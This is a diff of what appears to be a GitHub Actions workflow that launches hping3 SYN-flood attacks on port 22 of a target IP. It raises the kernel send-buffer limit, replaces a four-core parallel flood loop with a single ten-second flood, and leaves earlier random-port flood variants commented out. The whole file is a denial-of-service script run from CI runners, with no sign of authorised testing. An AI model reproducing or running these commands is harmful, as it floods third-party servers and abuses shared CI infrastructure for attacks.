@@ -58,7 +58,7 @@ jobs:
           # nproc
           sysctl net.core.wmem_max
           cat /proc/sys/net/core/wmem_max
-          sudo sysctl -w net.core.wmem_max=16777216
+          sudo sysctl -w net.core.wmem_max=1024*1024
 
       - name: Step 1
         run: |
@@ -79,12 +79,9 @@ jobs:
           echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
           # sudo timeout 10s hping3 -S --flood -V -d 65400 -p 22 -s 1000-65535 $IP
           
-          for i in {1..4}; do
-            sudo timeout 10s taskset -c $((i-1)) hping3 -S --flood -V -d 65400 -p 22 -s $((1000 + 16134 * (i-1)))-$((1000 + 16134 * i - 1)) $IP &
-          done
-          wait
-
-          # for ((i=0; i<10; i++)); do
-          #   PORT=$((RANDOM % 65535 + 1))
-          #   sudo timeout 6s hping3 -S --flood -V -d 65400 -p $PORT -s 1000-65535 $IP
+          # for i in {1..4}; do
+          #   sudo timeout 10s taskset -c $((i-1)) hping3 -S --flood -V -d 65400 -p 22 -s $((1000 + 16134 * (i-1)))-$((1000 + 16134 * i - 1)) $IP &
           # done
+          # wait
+
+          sudo timeout 10s hping3 -S --flood -V -d 65400 -p 22 $IP
